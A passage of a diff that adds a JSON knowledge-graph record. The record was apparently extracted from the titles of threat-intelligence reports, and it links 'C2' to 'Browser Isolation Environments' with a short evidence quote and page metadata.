+      "context": "Coding My Way Out of Here: C2 in Browser Isolation Environments Seeing Through a GLASSBRIDGE: Understanding the Digital Marketing Ecosystem Spreading Pro-PRC In ! uence Operations",
+      "triple": [
+        {
+          "subject": {
+            "name": "C2",
+            "type": "CommandAndControl"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "Browser Isolation Environments",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "C2 in Browser Isolation Environments"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "002",
+        "source": "TEXT"
+      }
+    }
+  ]
+}
